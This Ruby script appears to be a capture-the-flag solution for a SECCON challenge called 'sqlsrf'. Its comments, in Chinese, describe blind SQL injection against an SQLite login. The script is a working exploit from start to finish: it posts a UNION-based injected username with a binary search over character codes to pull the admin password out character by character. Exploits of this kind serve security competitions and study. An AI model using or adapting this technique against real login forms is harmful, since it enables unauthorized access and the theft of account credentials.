# encoding: UTF-8

# sqlite injection (POST method) (二分搜)
# SECCON sqlsrf爆admin密碼 

require 'net/http'
require 'uri'

$url = 'http://sqlsrf.pwn.seccon.jp/sqlsrf/index.cgi'
$ans = ''

(1..100).each do |i|
    l = 48
    r = 122

    while(l <= r)
        #puts "left: #{l}, right: #{r}"
        break if l == r

        mid = ((l + r) / 2)
        $query = "kaibro'union select '62084a9fa8872a1b917ef4442c1a734e' where (select unicode(substr(password,#{i},#{i})) from users where username='admin') > #{mid} and '1'='1"
        
        res = Net::HTTP.post_form URI($url), {"user" => $query, "pass" => "kaibro", "login" => "Login"}
        
        if res.body.include? 'document.location'
            l = mid + 1
        else
            r = mid
        end

    end
    $ans += l.chr
    puts $ans

end
